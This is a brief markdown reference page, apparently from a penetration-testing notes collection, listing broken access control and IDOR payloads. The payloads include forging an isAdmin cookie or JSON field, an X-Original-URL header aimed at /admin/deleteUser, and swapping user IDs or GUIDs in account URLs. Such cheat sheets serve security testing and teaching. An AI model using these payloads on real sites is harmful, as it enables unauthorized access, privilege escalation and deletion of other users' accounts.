---
title: Broken Access Control Examples
desc: Examples of Broken Access Controls.
tags: [AccessControl, IDOR, PrivEsc, Web]
alts: [IDORExamples]
website: 
render_with_liquid: false
---

## Request parameter

```html
<!-- Change parameter -->
Cookie: isAdmin=true
```

<br />

## POST body

```
POST / HTTP/1.1
...

{
    "email": "new-email@example.com",
    "isAdmin": true
}
```

<br />

## Request method and X-Original-URL

```
POST / HTTP/1.1
...
X-Original-URL: /admin/deleteUser
...

username=michael
```

<br />

## User ID

```
https://vulnerable.com/account?id=michael
https://vulnerable.com/account?id=admin
https://vulnerable.com/account?id=administrator
```

<br />

## GUID (globally unique identifier)

GUID cannot be guessed but it may be found somewhere in the website.

```
https://vulnerable.com/account?id=7230b2a9-60de-4409-a350-cd14986a8d3e
https://vulnerable.com/account?id=1de655cb-29d7-4008-b434-e688b39f9564
```